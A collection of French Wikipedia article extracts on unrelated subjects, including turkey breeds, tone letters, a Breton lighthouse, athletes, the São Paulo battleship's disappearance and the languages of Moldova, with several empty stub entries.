C'est un oiseau très rustique, supportant les intempéries. Il est vigoureux et de format trapu, son plumage est d'un noir mat sans reflets bronze. Le dindon peut atteindre , la dinde . La femelle est une bonne couveuse. Comme le dindon noir de Bresse, cette race n'a pas encore de standard homologué.

</doc>
<doc id="9413262" url="https://fr.wikipedia.org/wiki?curid=9413262" title="Barre de ton">
Barre de ton

Les barres de ton sont des symboles utilisés pour écrire les tons des langues tonales dans certaines transcriptions phonétiques. On attribue leur invention à Chao Yuen Ren. Les cinq barres de ton de base (tons très haut, haut, moyen, bas, très bas) ou trois barres (tons haut, moyen, bas) peuvent être combinées pour décrire des contours de ton complexes. Elles ont été adoptées comme notation des tons pour l’alphabet phonétique international comme variantes des diacritiques de ton (double accent aigu, accent aigu, macron, accent grave, double accent grave) en 1989.
Des variantes de ces barres de ton sont utilisées en phonétique de langues asiatiques (principalement Extrême Orient et Asie du Sud-Est), telles que les langues sino-tibétaines (langues chinoises, birmanes, tibétaines), austro-asiatiques : (lao, thai, vietnamien, mais pas cambodgien) ou bien langues japoniques (japonais et ses dialectes, okinawaïen (éteint)) ainsi que des langues d'Afrique de l'Ouest, telles que le bambara, le peul, le wolof, etc :

</doc>
<doc id="9413266" url="https://fr.wikipedia.org/wiki?curid=9413266" title="Barres de ton">
Barres de ton



</doc>
<doc id="9413273" url="https://fr.wikipedia.org/wiki?curid=9413273" title="Phare du Tréhic">
Phare du Tréhic

Le phare du Tréhic est situé dans la commune du Croisic, dans le département français de la Loire-Atlantique. Il est édifié à l'extrémité de la jetée du même nom.
Présentation.
La jetée du Tréhic est construite entre 1839 et 1844 par un entrepreneur d'Amboise, Sylvain Deslandes, sous la conduite de l'ingénieur Jules Maillard de la Gournerie. Ce brise-lames de granit long de protège l'entrée du port et des traicts du Croisic en atténuant les courants violents. Jusqu'en 1868, seule une balise en bois marque l'extrémité de la jetée.
Le phare est construit de 1869 à 1872 par l'ingénieur des ponts et chaussées Chatonay et l'entrepreneur nantais Pierre Jeanneau sur le musoir de la jetée du Tréhic. Électrifié en 1950, il signale l'accès au port du Croisic qui peut être gêné par des hauts-fonds. Sa tourelle de neuf mètres de haut en pierres de taille des carrières de Batz-sur-Mer est surmontée d'une lanterne métallique, remplacée en 1963, aux vitres teintées de vert.
La maison du gardien du phare est construite en même temps que le phare lui-même, au départ de la digue sur le côté droit. Ce logement est en forme de fer à cheval, selon la forme de l'ancienne batterie de défense côtière qui protégeait le port à cet endroit et qui sert de soubassement au bâtiment actuel. Il dispose d'une cour intérieure, son fronton et la grille d'entrée sont à l'emblème du service des phares et balises.

</doc>
<doc id="9413281" url="https://fr.wikipedia.org/wiki?curid=9413281" title="Barclay Goodrow">
Barclay Goodrow

&lt;dfn&gt;Barclay Goodrow&lt;/dfn&gt; (né le à Toronto en Ontario au Canada) est un joueur professionnel canadien de hockey sur glace qui évolue au poste d'ailier droit pour les Rangers de New York dans la LNH. Il grave son nom sur la Coupe Stanley en 2020 et 2021 avec Tampa Bay.
Biographie.
En club.
Barclay Goodrow commence en 2009 avec le Battalion de Brampton, qui devient à partir de 2013 le Battalion de North Bay, en LHO. Il signe un contrat avec les Sharks de San José en et fait ses débuts avec sa nouvelle équipe lors de la saison 2014-2015.
Le , il marque son premier but dans la LNH contre le gardien de but Ben Scrivens, des Oilers d'Edmonton en première période. Melker Karlsson et James Sheppard récolte les assistances du but. Le match se termine 5-2 en faveur des Sharks.
Le , il est échangé au Lightning de Tampa Bay avec un choix de tour en 2020 en retour de l'attaquant Anthony Greco et un choix de 1ère ronde en 2020.
Il remporte la Coupe Stanley en 2020 et en 2021 avec Tampa Bay.
Il est échangé aux Rangers de New York le en retour d'un choix de septième tour lors du repêchage d'entrée dans la LNH 2022.

</doc>
<doc id="9413283" url="https://fr.wikipedia.org/wiki?curid=9413283" title="Dale Stephens">
Dale Stephens

Dale Christopher Stephens est un footballeur anglais, né le à Bolton, en Angleterre. Il évolue au poste de milieu de terrain.
Biographie.
Le , il signe en faveur de Brighton &amp; Hove Albion.
Le , il rejoint Burnley FC.

</doc>
<doc id="9413286" url="https://fr.wikipedia.org/wiki?curid=9413286" title="Generator">
Generator

Generator est un mot anglais signifiant « générateur ». Il peut faire référence à :

</doc>
<doc id="9413296" url="https://fr.wikipedia.org/wiki?curid=9413296" title="Rohan Ince">
Rohan Ince

Rohan Ince, né le à Whitechapel au Royaume-Uni, est un footballeur international montserratien. Il évolue au poste de milieu défensif ou de défenseur central à Woking.
Biographie.
Il est cousin éloigné de Paul Ince et le neveu d'Eric Young.
Le , il signe à faveur de Brighton &amp; Hove Albion.
Le , il est prêté à Fulham.
Le , il est prêté à Swindon Town
Le , il est prêté pour une saison à Bury.

</doc>
<doc id="9413298" url="https://fr.wikipedia.org/wiki?curid=9413298" title="Ordre du Timor oriental">
Ordre du Timor oriental

L’ordre du Timor oriental () est un ordre honorifique et militaire fondé en 2009.
Historique.
C'est la plus grande décoration civile décernée au Timor oriental.
Fondée en 2009, l'ordre a été créé pour reconnaître les actions exemplaires et les services rendus pour le Timor oriental. Il est d'une nature plus générale et plus large que les ordres originaux liés à l'indépendance du Timor oriental. L'ordre reconnaît les contributions des Est-timorais et de ressortissants étrangers qui ont apporté une contribution significative au Timor oriental.
Critères.
L'Ordre du Timor-Leste reconnaît des actes tels que:
Le président du Timor oriental peut présenter l'Ordre du Timor Oriental de sa propre initiative, par la proposition de l'Assemblée nationale, ou par une proposition du Conseil des ministres. Le ministre de la Défense et de la Sécurité et le chef d'état-major de l'armée est consulté lors de l'ordre doit être présenté à des Timorais ou à des militaires étrangers. Le ministre de la Défense et de la Sécurité et le commandant général de la Police nationale du Timor-Leste est consulté chaque fois que l'ordre doit être présenté à Timorais ou membres étrangers des forces de police. Le ministre des Affaires étrangères est consulté à chaque fois que l'ordre doit être présentée à un étranger.
Structure.
L'Ordre du Timor Oriental est présenté en quatre catégories :
Chaque grade ne peut être accordé une fois sur la même personne. La Grand-Croix est accordé exclusivement à des chefs d'État.
À la fin de leur mandat les personnes qui ont servi en tant que président de la République ont le droit d'être décoré de la Grande-croix de l'Ordre du Timor-Leste. Le collier est accordé le jour suivant l'installation du prochain Président de la République.
La médaille de l'ordre peut également être accordée aux collectivités, aux institutions, des diplomates, des forces et des unités de police et des unités militaires. La médaille est accordée à des entités jugées dignes de reconnaissance par le biais d'un rapport officiel du Conseil des ministres.

</doc>
<doc id="9413299" url="https://fr.wikipedia.org/wiki?curid=9413299" title="Barais">
Barais



</doc>
<doc id="9413307" url="https://fr.wikipedia.org/wiki?curid=9413307" title="Parc d'attractions du Châtelard">
Parc d'attractions du Châtelard



</doc>
<doc id="9413311" url="https://fr.wikipedia.org/wiki?curid=9413311" title="Route départementale 165 (Finistère)">
Route départementale 165 (Finistère)



</doc>
<doc id="9413312" url="https://fr.wikipedia.org/wiki?curid=9413312" title="Joe Ralls">
Joe Ralls

Joseph William Ralls, plus connu sous le nom Joe Ralls (né le à Aldershot au Royaume-Uni), est un footballeur anglais. Il joue depuis 2011 au poste de milieu de terrain pour le club de Plymouth Argyle FC.
Il compte aussi une sélection en équipe d'Angleterre des moins de 19 ans de football.
Biographie.
Durant toute son enfance, Joe Ralls avoue être un fan du club de Manchester United au point de faire régulièrement le trajet entre Aldershot, sa ville natale, et Old Trafford ().
Il fait ses premiers pas de footballeur dans le club de sa ville natale, Aldershot Town, avant de rejoindre Farnborough, un autre club amateur. C'est là qu'il est repéré par des recruteurs de Cardiff City qui l'incorporent à leur centre de formation. Ralls y fait ses armes et, l'année suivante, signe son premier contrat professionnel. Quelques mois plus tôt, il avait joué son premier match officiel, le , lors d'une rencontre de Coupe de la Ligue sur le terrain d'Oxford United. Ce jour-là, il entre sur le terrain à la de jeu en remplacement d'Andrew Taylor alors que le score est d'un but partout. Cardiff finira par s'imposer 3-1 et ira même jusqu'en finale de l'épreuve, quelques mois plus tard.
À l'issue de cette première saison, Ralls compte 10 matchs de championnat, ainsi que 4 matchs de Coupe de la Ligue joués.
La saison suivante, il part sur des bases similaires, mais, à seulement, peine à se faire une place dans une équipe qui vise la promotion en Premier League. Pourtant, lors d'un important match de championnat contre Middlesbrough le , il entre en jeu à la à la place d'un Andrew Taylor blessé et réalise, en compagnie d'un autre jeune joueur du club, Ben Nugent, une partie remarquée par la presse et par l'entraîneur du club Malky Mackay.

</doc>
<doc id="9413315" url="https://fr.wikipedia.org/wiki?curid=9413315" title="Synagogue de Zweibrücken (1879-1938)">
Synagogue de Zweibrücken (1879-1938)



</doc>
<doc id="9413321" url="https://fr.wikipedia.org/wiki?curid=9413321" title="Dindon bronzé d'Amérique">
Dindon bronzé d'Amérique

Le dindon bronzé d'Amérique est une race de dindon originaire d'Amérique du Nord également élevée en Europe.
Connu pour sa forte masse, il a été croisé avec plusieurs races françaises afin d'en augmenter leur taille.
Description.
Il s'agit d'une race de grande taille, appréciée pour sa viande et ses œufs. La dinde de race Bronzé d'Amérique est aussi bonne couveuse.

</doc>
<doc id="9413322" url="https://fr.wikipedia.org/wiki?curid=9413322" title="Mouvement protestataire de 2015 en Moldavie">
Mouvement protestataire de 2015 en Moldavie

Le mouvement protestataire de 2015 en Moldavie se réfère à une vague de protestations en Moldavie, principalement à Chișinău, contre toute la classe politique et la corruption endémique, qui dure de mars 2015 à la fin de l'année 2016. 
Les principales causes des manifestations sont l'aggravation de la situation économique, alimentée par une fraude bancaire de 1 milliard de dollars (soit 15 % du PIB), et la dépréciation du niveau de vie. Ces manifestations sont surnommées dans la presse internationale le Maïdan moldave, en référence au mouvement de l'Euromaïdan en Ukraine.
Manifestation du 13 septembre.
Entre et se rassemblent sur la place centrale de Chișinau pour exiger la démission du gouvernement et du président Nicolae Timofti et un plébiscite pour choisir un nouveau chef d'État, qui a été élu par le parlement. Des militants du Bloc Rouge – l'aile gauche radicale du parti « Notre maison est la Moldavie » – tentent de forcer les portes du bureau du procureur général, provoquant des affrontements avec la police, qui a arrêté sept personnes. Plusieurs personnes sont blessées.

</doc>
<doc id="9413325" url="https://fr.wikipedia.org/wiki?curid=9413325" title="Mike fincke">
Mike fincke



</doc>
<doc id="9413326" url="https://fr.wikipedia.org/wiki?curid=9413326" title="Mona Yamamoto">
Mona Yamamoto

 est une présentatrice de télévision norvégio-japonaise. Son père est norvégien et elle devient un citoyenne japonaise à l'âge de 6 ans.
Une fois diplômée de l'Université Gakushūin, Mona devient présentatrice à l'Asahi Broadcasting Corporation. Elle présente la série "Jackass" au Japon. En , elle travaille brièvement pour le programme d'actualités de Tokyo Broadcasting System "News23".
Elle répugne à l'attention du public pendant un temps, et quitte son poste de présentatrice à Fuji Television après une affaire scandaleuse avec Tomohiro Nioka, un joueur marié de baseball des Yomiuri Giants, en 2008. Elle présente plus tard ses excuses et annonce son intention de retourner dans le monde du divertissement.
En 2010, elle épouse le président d'une société d'investissement immobilier. Le , Yamamoto annonce qu'elle prend sa retraite de la vie publique.

</doc>
<doc id="9413329" url="https://fr.wikipedia.org/wiki?curid=9413329" title="Mike Barratt">
Mike Barratt



</doc>
<doc id="9413336" url="https://fr.wikipedia.org/wiki?curid=9413336" title="São Paulo (cuirassé)">
São Paulo (cuirassé)

Le São Paulo est le second cuirassé de classe Minas Geraes construit par la société britannique Armstrong Whitworth et Vickers pour le compte de la Marine brésilienne. Le navire est nommé en l'honneur de l'état et de la ville de São Paulo.
Le "São Paulo" est lancé le et commissionné le . Peu de temps après, il a participé à la révolte du fouet. Après l'entrée du Brésil dans la Première Guerre mondiale, le Brésil propose aux Alliés d'intégrer le "São Paulo" et le "Minas Geraes" à la "Grand Fleet", ce qui sera refusé du fait de leur système de conduite de tir obsolète. Lors de la Seconde Guerre mondiale, le "São Paulo", désuet technologiquement, sert de défense au port de Recife.
Le navire est perdu en mer au nord des Açores sur le chemin du chantier naval de démolition.
Disparition.
Après une carrière où, comme son sisterhip Minas Geraes il aura surtout joué le rôle inactif de "flotte en vie" et de batterie flottante, ancrée à demeure devant les grands ports brésiliens, durant la Seconde Guerre mondiale (au cours de laquelle le Brésil s'est rangé aux côtés des alliés et a participé activement à la campagne d'Italie et à la lutte aéro-navale contre les U boote) le "Sao Paulo," totalement obsolète et absolument inutile avec le retour de la paix, est désarmé, ses canons et ses machines sont démontés et un entrepreneur britannique le rachète en 1950 pour récupérer la ferraille dans un chantier de démolition écossais. Il quitte donc le mouillage de la baie de Rio de Janeiro le , tiré par deux remorqueurs de haute mer, le "Dexterous" et le "Bustler ." Un équipage de gardiennage de 8 marins britanniques était embarqué sur le cuirassé réduit à l'état de ferraille inerte, privé de puissance motrice, d'électricité et, grave négligence, de moyens de communications radio.
Le , la situation se déteriora brusquement: Baromètre en baisse, arrivée d'une tempête et surtout avarie de gouvernail sur le second remorqueur, qui dut larguer son aussière et tenter de se traîner, vaille que vaille, jusqu'aux Açores pour réparations.
Resté seul , le "Bustler" dut tenter d'étaler la tempête mais à 8 heures du soir la remorque se rompit et un violent grain de pluie masqua totalement la visibilité. Au petit matin, le "Sao Paulo" n'était plus visible, et le patron du "Bustler" lança des appels radio.
Deux cargos qui s'étaient mis à la cape dans la tempête signalèrent avoirs aperçu des fusées de détresse, incitant le "Bustler" à se rendre directement sur zône en abandonnant la recherche méthodique par "carrés croissants" qu'il avait entreprise. Les recherches s'avérant infructueuses, la compagnie de remorquage Overseas Salvage and Towing dépêcha de Falmouth le puissant remorqueur "Turmoil" et son très expérimenté commandant Parker, qui devaient devenir célèbres un an plus tard, lors du remorquage épique du cargo "Flying Entreprise." Des avions de la RAF entreprirent également des recherches, compliqués par une incertitude croissante sur l'éventuelle position du "Sao Paulo." Les avions transmirent des rapports vagues et contradictoires (masse noire pouvant aussi bien être l'ombre de nuages, voire...un mammifère marin), le "Turmoi"l et le "Bustler" agissant de concert "briquèrent" consciencieusement la mer quatre jours durant, en pure perte, et abandonnèrent finalement les recherches, et les huit infortunés marins laissés à bord du cuirassé.
L'affaire fut assez largement médiatisée à l'époque (le suspense entourant les recherches était une bonne affaire pour les gens de presse et de radio) et contribua à alimenter diverses élucubrations et légendes urbaines sur le prétendu Triangle des Bermudes, alors même que le lieu présumé de la disparition du "Sao Paulo" et des huit matelots était bien différent.
L'enquête du Board of Trade (le ministère du commerce britannique, compétent en matière d'enquêtes-accidents) pointa vers des conclusions bien plus prosaïques : Bien que les commandants de remorqueurs aient déclaré avoir pris soin de remplir les water - ballasts du "Sao Paulo" pour l'équilibrer en compensant la dépose de sa machinerie, l'infortuné cuirassé aurait chaviré et coulé presque immédiatement après la rupture des aussières de remorquage, en tombant travers au vent et aux lames, en raison d'ouvertures sur coque (hublots et prises d'eau insuffisamment aveuglées par des tôles soudées) façon implicite de faire retomber la responsabilité sur la marine brésilienne à qui incombaient ces travaux de sécurisation.

</doc>
<doc id="9413339" url="https://fr.wikipedia.org/wiki?curid=9413339" title="Dindon porcelaine">
Dindon porcelaine

Le Dindon Porcelaine est une race de dindon français récente, originaire du Limousin, homologuée en 2007 par Gérard Roumilhac. Il s'agit d'un croisement entre le dindon jaspé de Ronquières, le dindon rouge des Ardennes et le dindon bleu de Suède.
Description.
Le dindon porcelaine est de taille modeste. Son plumage est tricolore à dominante gris cendré.

</doc>
<doc id="9413341" url="https://fr.wikipedia.org/wiki?curid=9413341" title="Zhou Mi (chanteur)">
Zhou Mi (chanteur)

Zhou Mi né le , est un chanteur chinois, membre du sous-groupe de Super Junior, Super Junior-M ainsi que du groupe de ballade, SM The Ballad.
En 2014, il sort son premier mini-album, "Rewind".
Biographie.
Jeunesse.
Zhou Mi est né à Wuhan en Chine et étudie la radiodiffusion au "Beijing Normal University Zhuhai Campus". Au lycée, Zhou Mi a commencé à participer à des compétitions nationales de chant, remportant la plupart d'entre elles.
Super Junior-M.
Le groupe débute en Chine le , avec la sortie de "U", une version en mandarin du titre "U" de Super Junior sorti en 2006. Zhou Mi est le chanteur principal du sous-groupe.
Hôte.
Le , Zhou Mi devient le nouveau présentateur de la de l'émission "The Show" sur SBS MTV aux côtés de Jiyeon (T-ara) et de Hongbin (VIXX).

</doc>
<doc id="9413344" url="https://fr.wikipedia.org/wiki?curid=9413344" title="Human">
Human

 signifie «  » en anglais et peut faire référence à :

</doc>
<doc id="9413345" url="https://fr.wikipedia.org/wiki?curid=9413345" title="Mobilisation des métaux non-ferreux">
Mobilisation des métaux non-ferreux



</doc>
<doc id="9413351" url="https://fr.wikipedia.org/wiki?curid=9413351" title="Mike Fincke">
Mike Fincke



</doc>
<doc id="9413352" url="https://fr.wikipedia.org/wiki?curid=9413352" title="Foire d'Ousse-Suzan">
Foire d'Ousse-Suzan

La foire de la Saint-Michel d'Ousse-Suzan ("assemblada de la Sent Miquèu d'Ossa Susan" en gascon) est une manifestation commerciale rurale de plein air d'origine médiévale. Elle est inscrite à l'Inventaire du patrimoine culturel immatériel en France au titre des pratiques festives.
Présentation.
Organisée chaque année le , jour de la saint Michel, dans le quartier de Suzan (), à trois kilomètres au sud-est d'Ousse-Suzan, autour de la chapelle romane dédiée à saint Jean Baptiste, cette foire date du .
Ce type de rassemblements à l'occasion de fêtes patronales, nommées localement « assemblade » (du gascon "assemblada"), était jadis un des rares moyens de rencontre entre les habitants de la Haute-Lande et jouait un rôle économique, social, commercial, médical et religieux.
On y échangeait non seulement des marchandises, mais aussi des informations, de la main-d'œuvre, des renseignements pratiques où la santé occupait une large place.
La foire de Suzan était la dernière des foires qui se tenaient chaque année dans les Landes, toujours au moment d'une fête religieuse, après celle du , jour de la Saint-Jean-Baptiste, à Bouricos.
Ces « assemblades » rythmaient la vie des Gascons. Les habitants des environs se déplaçaient en "kas" ou "bros" (charrette ou char) et se retrouvaient sur le site de Suzan d'abord pour des questions religieuses (le culte de saint Michel a toujours été très fort en France). Puis on pouvait se baigner dans les fontaines voisines pour y soigner maux de tête ou rhumatismes. Enfin, les assemblades jouaient un rôle social très fort : elles étaient le lieu de transactions économiques (bétail, marchandise), mais également de renouvellement des contrats de métayage, location de domestiques et d'ouvriers (appelée « louée »).

</doc>
<doc id="9413353" url="https://fr.wikipedia.org/wiki?curid=9413353" title="Massif du Stello">
Massif du Stello



</doc>
<doc id="9413354" url="https://fr.wikipedia.org/wiki?curid=9413354" title="Rougeot parasitaire de la vigne">
Rougeot parasitaire de la vigne

Le rougeot parasitaire de la vigne, ou "Rotbrenner", "Roter Brenner" (allemand), est une maladie fongique originaire d'Europe qui attaque la vigne ("Vitis vinifera") et d'autres espèces voisines. Cette maladie, qui attaque principalement les feuilles inférieures et moyennes et qui peut provoquer d'importantes défoliations, est due à un champignon phytopathogène, parasite des vaisseaux. Il s'agit d'une espèce de champignons ascomycètes de la famille des "Helotiaceae", "Pseudopezicula tracheiphila". Une espèce voisine, "Pseudopezicula tetraspora", provoque des symptômes similaires sur la vigne en Amérique du Nord.
Symptômes.
Le rougeot parasitaire se manifeste par des taches foliaires angulaires, relativement grandes, délimitées par les nervures principales et secondaires. Sur les cépages à raisins blancs, ces taches, situées entre les nervures et le bord du limbe, sont d'abord jaunâtres, puis deviennent brunes avec un contour caractéristique plus clair, jaune verdâtre. Sur les cépages à raisins noirs, les taches sont rouge brunâtre au contour rouge violacé.
Lors d'attaques précoces, au printemps, il peut se produire une défoliation totale de la base des rameaux. Lors d'attaques tardives, les dégâts sont plus limités, avec des taches plus petites, et n'entraînent aucune chute de feuilles.
Distribution.
Découverte en Suisse en 1903 par Hermann Müller, la maladie est présente dans certains vignobles d'Europe à climat frais. On la rencontre notamment en Allemagne, Autriche, France, Hongrie, Monténégro, Suisse, Roumanie, Serbie, la Moldavie, Ukraine et Russie.
Elle a également été signalée sous des climats plus chauds en Turquie, en Jordanie, en Tunisie ainsi qu'au Brésil.
On l'a également signalée en 1985 dans l'État de New-York, mais depuis ces cas ont été attribués à un autre agent pathogène, "Pseudopezicula tetraspora".

</doc>
<doc id="9413355" url="https://fr.wikipedia.org/wiki?curid=9413355" title="Massif du San Petrone">
Massif du San Petrone



</doc>
<doc id="9413357" url="https://fr.wikipedia.org/wiki?curid=9413357" title="Caryophyllia rugosa">
Caryophyllia rugosa

Caryophyllia rugosa est une espèce de coraux appartenant à la famille des Caryophylliidae.

</doc>
<doc id="9413358" url="https://fr.wikipedia.org/wiki?curid=9413358" title="Swann Nambotin">
Swann Nambotin

Swann Nambotin, né en 2002, est un acteur français. Il est connu pour son rôle de Victor dans "Les Revenants", série télévisée de Fabrice Gobert.
Biographie.
Swann Nambotin est originaire de la ville de Revonnas, dans le département de l'Ain en région Rhône-Alpes. C'est en passant un casting pour le film "La Guerre des boutons" qu'il a été repéré, et amené à jouer le personnage du petit Victor, un enfant revenu d'entre les morts et doué de pouvoirs surnaturels, dans la série télévisée "Les Revenants" en 2012. Victor est le frère de Paul joué par Martin de Myttenaere.
Stephen King, le célèbre romancier à suspense, a dévoilé sur Twitter qu’il était un véritable fan de la série française "Les Revenants". En 140 caractères, il a ainsi indiqué : 
Swann, alias Victor, dit n'avoir pas ressenti l'aspect angoissant de son personnage durant le tournage, et découvert seulement l'ambiance de la série aux projections en avant-première.

</doc>
<doc id="9413359" url="https://fr.wikipedia.org/wiki?curid=9413359" title="Rougeot parasitaire">
Rougeot parasitaire



</doc>
<doc id="9413364" url="https://fr.wikipedia.org/wiki?curid=9413364" title="Chris Ivory">
Chris Ivory

Christopher Lee Ivory, dit Chris Ivory, né le à Longview, est un joueur américain de football américain.
Depuis 2016, ce running back joue en National Football League (NFL) pour les Jaguars de Jacksonville, après avoir joué pour les Saints de La Nouvelle-Orléans et les Jets de New York.

</doc>
<doc id="9413365" url="https://fr.wikipedia.org/wiki?curid=9413365" title="Langues en Moldavie">
Langues en Moldavie

Les langues en Moldavie sont la langue maternelle ("limba maternă, limba părintească" ou родной язык) de la majorité autochtone ("naționalitatea băștinașă" ou "naționalitatea titulară") soit 78 % de la population, et les langues des autres communautés (сожительствующие нации, "naționalitățile conlocuitoare") du pays soit 22 % de la population. Les langues de Moldavie sont toutes également parlées dans les pays voisins.
Dénominations.
Sur le plan officiel et juridique, le russe, l'ukrainien, le gagaouze, le bulgare, le biélorusse, l’arménien, le polonais et les autres langues minoritaires de Moldavie ont chacune un seul nom officiel, qui est le même dans les autres pays où ces langues sont parlées. À l’exception du gagaouze, minoritaire aussi en Ukraine, toutes ont le statut de langue officielle respectivement en Russie, Ukraine, Bulgarie, Biélorussie, Arménie et Pologne.
En revanche, la langue de la majorité autochtone a officiellement eu, entre 1994 et 2023, deux noms : « Roumain » ("limba română" ) et « Moldave » ("limba moldovenească" ). Ces deux dénominations concernent la même langue "ausbau", « standard » ou « urbaine », parlée en Moldavie et Roumanie (où elle est langue officielle) par environ de locuteurs, dont en République de Moldavie (78% de la population).
Sur le plan linguistique, il existe tant dans la région roumaine de Moldavie (Moldavie occidentale) qu’en République de Moldavie et dans les régions ukrainiennes voisines jadis moldaves (Moldavie orientale), une manière "abstand", « traditionnelle » ou « populaire » de parler le roumain, pratiquée par environ de locuteurs : le parler moldave ("graiul moldovenesc"), usité, surtout en milieu rural, en parallèle avec la langue standard officielle.
Beaucoup de sources secondaires ont déduit de cette double-dénomination et de la confusion avec le parler populaire, que « moldave » serait un « dialecte du roumain » ou une langue séparée mais « proche du roumain » mais sur le plan sociolinguistique, la langue standard et le parler populaire, dont les locuteurs peuvent se comprendre spontanément et complètement sans traducteur ni dictionnaire, sont une seule et même langue. Appliquée au parler régional roumain des pays moldaves, l’appellation « Moldave » est une réalité linguistique scientifiquement vérifiable, tandis qu’appliquée à la langue standard pour ne désigner que ses locuteurs vivant dans les pays issus de l’ex-URSS (Moldavie, Ukraine et Russie principalement), l’appellation « Moldave » est un choix politique pro-russe remontant à un décret soviétique du en République socialiste soviétique autonome moldave, annulé le et remis en vigueur le , suivi par de nombreuses sources secondaires modernes.
Le moldave/roumain est langue maternelle pour 78% et langue comprise par 80,2 % de la population de la Moldavie : un cinquième des habitants de la Moldavie déclare en effet ne pas comprendre la langue officielle et majoritaire du pays, ce qui est un héritage de la période soviétique durant laquelle en Moldavie la langue officielle n’était pas la langue locale comme dans les trois pays baltes ou les trois pays caucasiens, mais le russe, comme en Biélorussie et en Ukraine.
Le Parti action et solidarité au pouvoir en Moldavie depuis les élections législatives moldaves de 2021 a décidé, après l’invasion de l'Ukraine par la Russie, d’entamer une procédure d'adhésion de la Moldavie à l'Union européenne et d’aligner la législation moldave sur le « droit du sol », pour que tous les citoyens du pays soient également des « Moldaves » quelles que soient leurs langues, et que cessent les tensions politiques générées par la double-appellation de la langue majoritaire, conforme au « droit du sang ». Le , le parlement moldave, sur proposition de l’Académie des sciences de Moldavie, a modifié l’article 13 de la Constitution, en remplaçant le nom « moldave » par « roumain » selon le modèle belge ou suisse où tous les citoyens du pays sont également des « Belges » ou des « Suisses » quelles que soient leurs langues. Depuis, les citoyens de la Moldavie sont désormais tous des Moldaves, avec le roumain comme langue usuelle de 78 % d’entre eux, à côté du russe, de l’ukrainien, du gagaouze et du bulgare. L’opposition pro-russe soit le bloc électoral des communistes et socialistes et le parti Șor, a voté contre.
Aujourd’hui (2025) le roumain est langue officielle de l’État, et en outre, le gagaouze (langue turque) l’est aussi en Gagaouzie, le russe et l’ukrainien en Transnistrie, le russe en Gagaouzie (où le gagaouze a retrouvé un usage prépondérant après avoir été éclipsé par le russe), ainsi que dans les villes de Moldavie, les aéroports, les gares, les points de passage frontaliers, les institutions publiques et les deux armées : gouvernementale et sécessionniste (à peu près équivalentes). À noter aussi qu’en Transnistrie, la langue maternelle des Moldaves, comme à l’époque soviétique, est officiellement désignée uniquement comme « moldave », et écrite en caractères cyrilliques.
Éducation.
Le taux d'alphabétisation chez les plus de en 2015 y est estimé à 99 % selon l'UNESCO, dont 100 % chez les hommes et 99 % chez les femmes.
Enseignement des langues étrangères.
Russe.
Le russe ayant officiellement été « langue de communication inter-ethnique » (язык межнационального общения, "limba de comunicare interetnică") aux époques russe et soviétique, et continuant à l’être usuellement, toute la population est également russophone ce qui facilite à la fois les mariages mixtes et la russification.
Anglais.
La première langue étrangère enseignée, après le russe, est l'anglais. En 2013 elle était enseignée à plus de 60 % des écoliers en tant que première langue étrangère, suivi du français avec moins de 50 %, puis de l'allemand.
Français.
La Moldavie est, depuis 1996, un État membre de plein droit de l'Organisation internationale de la francophonie et de l'Assemblée parlementaire de la francophonie.
Dans ce pays jadis très francophone, le français reste appris par environ la moitié des écoliers du secondaire : à la rentrée 2010-2011, le ministère de l’Éducation recensait 53,3 % d’apprenants de français. Pendant deux siècles, le français a été la première et souvent la seule langue étrangère enseignée, car jusqu’en 1991 les Moldaves avaient conservé la traditionnelle francophilie héritée de l’influence des "Lumières" dans les principautés roumaines au , mais aussi sous la domination russe au , dans le Royaume de Roumanie et même à l’époque soviétique au . Mais après 1989, avec la glasnost, la fin de la censure et l’ouverture du rideau de fer, les Moldaves découvrent que dans les médias francophones, leur pays n’existe pas, ou bien sort, peut-être, d’une fameuse bande dessinée belge, et qu’il est présenté bien souvent comme une région patriarcale, aux campagnes misérables, où règnent la traite des Blanches et les réseaux mafieux : une dont les aspirations culturelles et sociales sont qualifiées, comme dans les médias russes, d’. Ce regard péjoratif ajouté à la domination anglophone dans le monde économique, ont abouti à une érosion progressive du français au profit de l’anglais qui a fini par devenir la première langue vivante étrangère enseignée en 2010.
Pourcentage des élèves étudiant la langue étrangère :

</doc>
<doc id="9413369" url="https://fr.wikipedia.org/wiki?curid=9413369" title="Austin Seferian-Jenkins">
Austin Seferian-Jenkins

Austin Seferian-Jenkins, né le à Fox Island, est un joueur américain de football américain.
Depuis 2018, ce tight end joue en National Football League (NFL) pour les Jaguars de Jacksonville. Il a précédemment évolué chez les Buccaneers de Tampa Bay (2014-2016) et les Jets de New York (2016-2017).

</doc>
<doc id="9413372" url="https://fr.wikipedia.org/wiki?curid=9413372" title="Darius Sinathrya">
Darius Sinathrya

Daniel Sineon Darius Sinathrya Kartoprawiro est un acteur, presentateur, modele, chanteur et directeur sportif indonésienne né à Kloten en Suisse le .
Biographie.
Deuxième d'une famille de quatre enfants, il a été élevé dans la foi catholique, son père Pudjono S. Kartoprawiro était un expatrié indonésien qui travaillait en Europe comme employé de banque et sa mère Monica Elisabeth est suisse alémanique. Il n'a qu'un an, quand ses parents repartent vivre en Indonésie, ou son père a par la suite fonder un orphelinat à Yogyakarta.
Darius Sinathrya est un acteur habituer des comédies indonésiennes, mais il est devenu célèbre dans son pays depuis qu'il est devenu malgré son jeune âge en 2006, l'un des commentateurs sportifs de la Coupe du monde de football de 2006. Bien qu'il rêvait durant son enfance de devenir footballeur professionnel, il a depuis longtemps abandonner ce projet se révélant beaucoup plus doué pour le futsal, un sport qu'il considère "comme une meilleure alternative au football". Il a depuis été promu en 2010, manager de l'équipe nationale de futsal indonésienne.
Il épouse le , la mannequin indonésienne Donna Agnesia à l'église catholique Santa Catharina de Jakarta. Ensemble ils ont eu deux fils : Lionel Nathan (né le ) et Diego Andreas (né le ) ainsi qu'une fille, Quinesha Sabrina (née le 1er mai 2011).

</doc>
<doc id="9413373" url="https://fr.wikipedia.org/wiki?curid=9413373" title="Caryophyllia sarsiae">
Caryophyllia sarsiae

Caryophyllia sarsiae est une espèce de coraux appartenant à la famille des Caryophylliidae.

</doc>
<doc id="9413375" url="https://fr.wikipedia.org/wiki?curid=9413375" title="Hadjoutes">
Hadjoutes



</doc>
<doc id="9413376" url="https://fr.wikipedia.org/wiki?curid=9413376" title="Fox Island">
Fox Island

Fox Island est une île du Puget Sound et une "census-designated place" (CDP) dans le comté de Pierce dans l'État de Washington aux États-Unis. Elle porte le nom de Fox en l'honneur de J.L. Fox l'assistant chirurgien de l'expédition Wilkes.

</doc>
<doc id="9413385" url="https://fr.wikipedia.org/wiki?curid=9413385" title="Caryophyllia scillaemorpha">
Caryophyllia scillaemorpha

